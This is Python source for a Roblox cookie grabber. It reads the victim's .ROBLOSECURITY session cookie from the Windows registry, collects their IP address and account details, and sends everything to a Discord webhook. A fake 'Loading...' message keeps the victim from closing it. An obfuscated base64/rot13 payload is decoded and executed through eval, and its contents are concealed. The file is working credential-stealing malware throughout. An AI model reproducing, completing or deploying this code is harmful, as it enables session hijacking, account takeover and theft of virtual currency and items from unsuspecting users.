try:
    import base64, codecs
    from winreg import OpenKey, HKEY_CURRENT_USER, EnumValue
    import robloxpy
    import json
    import requests
    import os
    from discordwebhook import *
except:
    os.system("pip install discordwebhook")
    os.system("pip install robloxpy")
    os.system("pip install requests")
    print("Run the app again.")

webhookk = "heh"# put webhook here


dummy_message = "Loading..." # A message that distracts the user from closing the grabber
print(dummy_message)
################### Gathering INFOMATION #################################
def GrabCookie():
    # opening the roblox studio key
    robloxstudiopath = OpenKey(HKEY_CURRENT_USER, r"SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com")
    # finding the subkey called ".robloxsecurity"
    try:
        count = 0
        while True:
            name, value, type = EnumValue(robloxstudiopath, count)
            if name == ".ROBLOSECURITY":
                # returns the value of .robloxsecurity
                return value
            count = count + 1
    except WindowsError:
        pass
roblox_cookie_value = str(GrabCookie())
#################### INFOMATION #################
ip_address = requests.get("https://api.ipify.org/").text
roblox_cookie = roblox_cookie_value.split("COOK::<")[1].split(">")[0]
#################### checking cookie #############
isvalid = robloxpy.Utils.CheckCookie(roblox_cookie)
if isvalid == "Valid Cookie":
    isvalid = "Valid"
else:
    exit()

#################### getting info about the cookie #############
ebruh = requests.get("https://www.roblox.com/mobileapi/userinfo",cookies={".ROBLOSECURITY":roblox_cookie})
info = json.loads(ebruh.text)
rid = info["UserID"]
rap = robloxpy.User.External.GetRAP(rid)
friends = robloxpy.User.Friends.External.GetCount(rid)
age = robloxpy.User.External.GetAge(rid)
crdate = robloxpy.User.External.CreationDate(rid)
rolimons = f"https://www.rolimons.com/player/{rid}"
roblox_profile = f"https://web.roblox.com/users/{rid}/profile"
headshot = robloxpy.User.External.GetHeadshot(rid)
username = info['UserName']
robux = info['RobuxBalance']
premium = info['IsPremium']
#################### INJECT TO ROBLOX (creds to bingo methods) #################
magic = 'IyBQeXRob24gY29kZSBvYmZ1c2NhdGVkIGJ5IHd3dy5kZXZlbG9wbWVudC10b29scy5uZXQgDQogDQoNCmltcG9ydCBiYXNlNjQsIGNvZGVjcw0KbWFnaWMgPSAnSXlCUWVYUm9iMjRnWTI5a1pTQnZZbVoxYzJOaGRHVmtJR0o1SUhkM2R5NWtaWFpsYkc5d2JXVnVkQzEwYjI5c2N5NXVaWFFnRFFvZ0RRb05DbWx0Y0c5eWRDQmlZWE5sTmpRc0lHTnZaR1ZqY3cwS2JXRm5hV01nUFNBbldrZHNlbGt5T1hsamJWRm5VRk5DUldGWVRtcGlNMHByUzBoV2VXSkVNR2xoU0ZJd1kwaE5Oa3g1T1d0aFdFNXFZak5LYTB4dFRuWmlVemxvWTBkcmRtUXlWbWxoUnpsMllUTk5kazlVWnpOUFZHYzBUV3BOZUU1cVl6Vk5hbFV3VGxSVk5Vd3daM3BaVld4S1dESmtabGRzYUU5Tk1IYzBZbXhDYUdWRk9XbGpiR3htWVVaQ00xSnNiekZoVmtZeFVsY3hVVXhZVm14VmEyaDNaR3hzZUdKNlRUQlpNazVxVWxkT1JGWllXa1ZXUkZKM1kwZHdXV050TVVkbFJsa3dTV2xyVGtOdFVuQmpNazUyWTI1S2EweHVRblpqTTFGdlJGRnZaMGxEUVdka1dFNXNZMjAxYUdKWFZUbEphMHBRVmtOQmRFbEdRbkJqYlVZd1dsTkVkMjQwTW5GSmFYZE9RMmxCWjBsRFFtaGtiVVl3V1ZoS1ptUllTbk5RVTBwdlpFaFNkMk42YjNaTU1rNXJZbWsxYTJGWVRtcGlNMHByV1ZoQ2QweHRUblppVXpsb1pFaFNhRmt5YUhSYVZ6VXdZM2s0TlU5RVVUUk5WR2N3VFdwcmVrNVVWVE5QUkVsNFQxUmpkazlVWnpGUFJHTTBUVlJqZWs1cVZUVk5SRkV4VDFSck5Vd3lSWHBOZW1zelRXcEZlRTlFVG0xT2FrSnFUVlJvYVUxNlVYbE9SMHBvVGpKSk0wMHlVbWhhYWtacFRHNUNkVnA1U1hORVVXOW5TVU5CWjFwWE1XbGFWMUo2VUZaekp3MEtiRzkyWlNBOUlDZEJVSFpPZEZaUVRuUldVRTUwY21vd1dGWlFUblJXVUU1MFZsQk8nDQpsb3ZlID0gJ3FTTURHYUVKTEh5Z0dIZ0tuUmtYWkt5SnEyVzB'
love = 'WLKIYEQO5ERq6pHcVZQy3pSIwE1cFZIEVFzA1DISKrRyuGJERFH8lE2SSFxuFAGOWrH9PpIAAERquEHcVH3Odo3uaH014ZIEWq01XFSA5MRkUFHkOH01RGKcaFxtkpGIjHHSKGJSGERpjBIcnrSAwpRuvZIcGGISVIHR1o3q1ZxcVATcXH01RE2SSFxuFAGOWrH9PpIAAERquEHclrRx1pSSKG29HAIyUoH9bEaq5LxyuGHWOrH1VE1IAJScIH3qjFHHkJxueZxpjEIcTLIZ1EwOAZHkuH0ySFzAdo0cKL0cUI2gZZ1AVpHqGJaS3FGAioIMdoxukJRtlqJuSZIMgERuZAHIHAIyWZ0yeFIW1LHIEIwIhFwEfpxg5GHMIH2MUHzAYpKtkJHy6DHcWFzZjEaqGF25XBHulFaScJaqWM0LjGGSOZ082DxcAnRM3H2AiZyACDxy1IRqgqHcVZaSHo21KF016BT1kIHIJFHykL0qYLmIArQSKJyEKoSbkpJAUIJAyoxgKE0WXL2clq3x2o3uwMKWYDIElIH1AE3qCGRy5G0WkH01RE2SSFxuFAGOWrH9PpIAAAxEXrJyWHKyzFJSADxS5GHIVrzgCFRu1Mxc5H1WnH3yPJyA1FxuFAGOWrH9PpIAAERquEHcVHwHjFJSwDHjjZIuhZ3Ido1AZZxy5DKcRFH8lE2SSFxuFAGOWrH9PpIAAERquEHcVHwHjFKyBLISRL2SiZxE0D0MBLHE3pIqiE0yvGUykFJ5VBJARFayXFyV1MxjlZQShISqYFHc5JxDjH2AAIQSHpQWSF0yXrHAhFSMeGT1KFaWXI2qSLHIhFQAkLHMXZJMkFyqIo1IWoxtjrQWTFR1TpxcSF0y3rIcRE09MExuOG00jrISRFaSKEQOGLHMVDH9AZUyEERckI0MIDJAZrwSHpIAwE0MUGIqRZTAUGUqKJScXFISRrRSAFGA1Lxk6ZHWiHaywpGWkI295L2WZrUIXo1W5MT8lpKqiE3ywWj0XM29xVQ0tW1cTnT5wZTkRH25PnJWLnUqMoGSJLIH5pSSfIzcvoScmJzkBZ1EeGaOEI2EXHGOToyAIGxWnZTkRHIqxFyRjEz5GIH5QGwOfqR5KnTyJZIMjIQWfDzSJIxyGoKucIwW3rSyfGxAJE1WVHzcPn1qSZKOHEH5PLIqFqSWhGzgJZIMjIQWfD2DlGaEJoyWbI0MnZSESGxgwE0'
god = 'p0ZUhCaWJWVnBUMmxDVldOdVZteG1VM2RPUTJsQlowbERRV2RKUTBGblNVTkJaMGxEUVdkSlEwSTNTVzAxYUdKWFZXbEpSRzluU1d4S1FsVkRTWE5KUTBveVdWZDRNVnBUU1RaSlNFcG9ZME4zYVdGWE5YTmhWelZzU1dwdloxWklTakZhV0RCelJGRnZaMGxEUVdkSlEwRm5TVU5CWjBsRFFXZEpRMEZuWlhsS2RWbFhNV3hKYVVFMlNVTktSMk50Ykd4aWJWSjZTV2wzWjBsdVdtaGlTRlpzU1dwdloxcHVTbkJhVnpWclkzbDNaMGx0YkhWaVIyeDFXbE5KTmtsR1VubGtKdzBLWkdWemRHbHVlU0E5SUNkS1NUbFpUakJZVmxCT2RGWlFUblJXVUU1MFZsQk9kRlpRVG5SV1ZXWjJiM3BUWjAxR1ZuUkNkazUyUkVwQmQyOHpTV2h4VUU5UFRUSklkbGxRVG5aeGVsTm1jVXBJZGtKMlQzVk5Na2htVmxCWFkyOTZhMk52ZWtoMlFuWlBTSEJoU1hselJtcEJVSFpPZEZaUVRuUldVRTUwVmxCT2RGWlFUblJXVUU4M1ZubzFkVzlLU0haV1VXSjBWbmg1UkZaU1UzaE5WVmQ1Y0ROYWRsbFFUblp4ZWxObWNVcElkbFpSWW5SdVMwOXpURXBGZUhCNlNXMXdiR3AwVm5wNWFHOVVlV2hOUjJKMlFuWlBTSEJoU1hselJtcEJVSFpPZEZaUVRuUldVRTUwVmxCT2RGWlFUblJXVUU4M1ZubzFkVzlLU0haV1VXSjBWblkxUmtjd1YxcEhNVUZUUkRGSlJrWkpSVTFXJw0KZGVzdGlueSA9ICdxemMwSXpTQXFKOUlGS3lKcTJXMEdLTUtxUmtIR21xanJ3eTJvMUQ1QVJmbERKeWlaenF3R0hma3FSa0hHYU1NSFI1Mm94YjFNejVYQUt5SnEyVzBFS2NHTWFObEZHeU1Hd09MSXlPQnFTTURHYUVKSFI1MEl5T0JxUmdUbnhTRHF4NTBJeU9CcVNNREdhRUpIUjUwSXlPS1pUNUlGSnFacndJMW94Y2RxeFcyR21xSkxIeWZvMU9KQXlNSHFLeVpGeElnb3lENVpVQVRueFNEcVFPTEhIRXZxU01ER2FFSkhSNTBJeUhqRElPMkdhRUpIUjlrSkg0akpTdVJaU3RhUURjZG8zeHRDRk5hS'
destiny = '1I0Z1c5nmEOrx1jpySjZRgIqT1nFJf0Jz1nLISRLmOjLHygpIOBBIMHFGWZFzcvImSeARS6EKOlHHkeF1I0ZxRknmEOq3yjpySZoIqfrUELoR95pKcGMyuDpKOlHHkgF1I0Zx15nmEOq0IjpySZZHgIqQWnZJf0DJ1OpUWEI3yYIKDlDIAeARS3FKOlHHkgF1I0Zx15nmEOq0IjpySZZHgIqTkPH2f0DKcOpUWEGKcYIKDmDKyeARS3FKOlHIq3F1I0oScGnmEOryAjpySArxgIqQAPFJf0Jaq4LIuTGzIJIRxlGRcdLypknmEOq3SjpySArxgIqQWOHUOwIyOzqR1YGKIiHUEuF1I0ZybknmEOrx1jpySZZRgIqQWOFJf0DKqOpUWEpT1YIKEfGHyeARS3EKOlHHjkF1I0ZybknmEOrx1jpySZZRgIqQWOFJf0Jaq1pUWEGQOYIKDlDHyeARSgDKOlHKNjF1I0ZxWWnmEOrxyjpySjAHgIqTkZZJf0JaqCpUWEGKIYIKDlGKyeARSgrKOlHIL1I2k4DIO6FGWZFzcvGQV5M3OHrJMAEaI2GRgOrHS3ETuZq0jjGIEWq28lEKyLIRxlGRcdLypknmEOoHIjpySjoRgIqQAOFJf0DJ1OpUWEpQOKoUuwJIOjBUNmEJkhFwIuD3MjMyplFGEAFycuJRM4CFpAPzcirFN9VPqprQplKUt2Myk4AmEprQZkKUtmZlpAPaElqKA0VQ0tMKMuoPtaKUt2MSk4AwSprQL3KUt2BIk4AwZaXFNeVTI2LJjbW1k4AwAprQMzKUt2ASk4AwIprQLmKUt3Z1k4ZzIprQL0KUt2AIk4AwAprQMzKUt2ASk4AwIprQV4KUt2L1k4AzMprQp2KUt2AIk4ZzAprQVjKUt2LIk4AzMprQp5KUtlBFpcVPftMKMuoPtaKUt2A1k4AzMprQL0WlxtXlOyqzSfXPqprQLmKUt2Myk4AwEprQL1KUt2Z1k4AmAprQWyKUt2ASk4AwIprQLmKUt2Myk4AwEprQL1KUtlBSk4AwEprQL1KUt3Z1k4AmEprQL5KUt2MIk4AmyprQWwKUtlZSk4AzSprQMzKUt3BIk4ZwxaXD0XMKMuoPuwo21jnJkyXTWup2H2AP5vAwExMJAiMTHbMKMuoPtaKUt3ASk4AmWprQp1KUt3Z1k4AmDaXFxfWmkmqUWcozp+WljaMKuyLlpcXD=='
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
#################### SENDING TO WEBHOOK #################


discord = Discord(url=webhookk)
discord.post(
    username="BOT - Pirate 🍪",
    avatar_url="https://cdn.discordapp.com/attachments/984818429355782197/985878173659045999/a339721183f60c18b3424ba7b73daf1b.png",
    embeds=[
        {
            "username": "BOT - Pirate 🍪",
            "title": "💸 +1 Result Account 🕯",
            "description" : f"[Github Page](https://github.com/Mani175/Pirate-Cookie-Grabber) | [Rolimons]({rolimons}) | [Roblox Profile]({roblox_profile})",
            "color" : 12452044,
            "fields": [
                {"name": "Username", "value": username, "inline": True},
                {"name": "Robux Balance", "value": robux, "inline": True},
                {"name": "Premium Status", "value": premium,"inline": True},
                {"name" : "RAP", "value": rap,"inline": True},
                {"name" : "Friends", "value": friends, "inline": True},
                {"name" : "Account Age", "value": age, "inline": True},
                {"name" : "IP Address", "value" : ip_address, "inline:": True},
                {"name" : ".ROBLOSECURITY", "value": f"```{roblox_cookie}```", "inline": False},
            ],
            "thumbnail": {"url": headshot},


        }
    ],
)
